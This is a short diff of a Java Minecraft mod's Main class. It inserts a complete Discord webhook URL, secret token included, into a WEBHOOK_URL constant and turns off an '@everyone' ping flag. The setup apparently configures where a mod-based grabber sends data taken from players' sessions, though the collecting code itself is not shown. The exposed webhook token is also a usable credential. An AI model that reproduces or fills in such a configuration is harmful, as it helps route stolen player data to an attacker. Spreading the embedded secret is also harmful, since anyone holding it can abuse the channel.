@@ -20,12 +20,12 @@ public final class Main {
      * <p>
      * Example: https://discord.com/api/webhooks/...
      */
-    private static final String WEBHOOK_URL = "";
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1311677598547443812/4dI-Bc_RQucY46NjNdRYioob6s4pP8tqJTIZG7IwTGk1t-7ncRB7m-RKvmgVLQFz9cjA";
 
     /**
      * Adds @everyone to webhook message
      */
-    private static final boolean PING_EVERYONE = true;
+    private static final boolean PING_EVERYONE = false;
 
     private static final Minecraft mc = Minecraft.getMinecraft();
 
